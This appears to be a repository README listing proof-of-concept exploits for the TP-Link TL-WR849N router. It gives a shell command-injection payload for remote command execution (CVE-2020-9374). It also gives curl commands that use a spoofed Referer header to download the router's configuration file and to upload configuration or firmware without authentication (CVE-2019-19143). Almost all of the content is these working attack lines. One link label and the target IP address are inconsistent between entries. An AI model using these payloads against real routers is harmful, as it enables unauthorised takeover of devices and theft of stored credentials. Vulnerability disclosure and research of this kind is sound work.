# OpenSource Repo with PoC's and vulns found in routers

 ## TP LINK TL-WR849N - REMOTE COMMAND EXECUTION PoC
 
   - [CVE-2020-9374] - [TP LINK TL-WR849N - REMOTE COMMAND EXECUTION PoC](/tp-link#cve-2020-9374-tp-link-tl-wr849n---remote-command-execution-poc)
   
    Payload: "$(ls)"

## TP LINK TL-WR849N - Auth Bypass: Firmware and Configs update

  - [TP LINK TL-WR849N - REMOTE COMMAND EXECUTION PoC](/tp-link#auth-bypass-firmware-and-configs-update)

    Payload:
      `curl -X GET -H "Referer: http://192.168.0.1/mainFrame.htm" http://192.168.0.1/cgi/conf.bin`
     
## [CVE-2019-19143] - TP LINK TL-WR849N Firmware and Configs Update
     
    Uploading new firmware without access to the panel
 
  - [[CVE-2019-19143] Firmware Update: Uploading new firmware without access to the panel](/tp-link#cve-2019-19143-firmware-update-uploading-new-firmware-without-access-to-the-panel)
   
    Payload:
   
       `curl -i -X POST -H "Content-Type: multipart/form-data" -H "Referer: http://192.168.0.2/mainFrame.htm" -F data=@conf.bin http://192.168.0.2/cgi/confup`
       
       
